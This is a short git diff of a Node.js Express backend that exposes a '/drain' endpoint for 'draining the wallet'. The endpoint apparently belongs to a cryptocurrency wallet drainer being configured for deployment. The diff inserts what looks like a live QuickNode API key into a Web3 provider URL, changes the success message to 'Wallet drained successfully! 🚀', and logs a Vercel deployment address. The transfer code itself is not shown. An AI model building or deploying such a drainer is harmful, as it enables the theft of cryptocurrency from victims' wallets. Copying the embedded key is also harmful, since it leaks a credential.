@@ -8,9 +8,8 @@ const port = process.env.PORT || 3000;
 // Use body-parser to parse JSON requests
 app.use(bodyParser.json());
 
-// Set up Web3 provider (you can use Infura or your own node)
-// Replace with your Infura project ID if you want to use it
-const web3 = new Web3('https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID');
+// Set up Web3 provider using your QuickNode API key
+const web3 = new Web3('https://mainnet.infura.io/v3/QN_801713e80c764d00a9cff03a4a888bf6');
 
 // Endpoint for draining the wallet
 app.post('/drain', async (req, res) => {
@@ -34,7 +33,7 @@ app.post('/drain', async (req, res) => {
 
     res.status(200).json({
       success: true,
-      message: 'Wallet drained successfully!',
+      message: 'Wallet drained successfully! 🚀',
       transactionHash: transaction.transactionHash,
     });
   } catch (err) {
@@ -49,4 +48,5 @@ app.post('/drain', async (req, res) => {
 // Start the server
 app.listen(port, () => {
   console.log(`Backend running on http://localhost:${port}`);
+  console.log(`Deployment URL: https://tokenbackendwork.vercel.app`);
 });
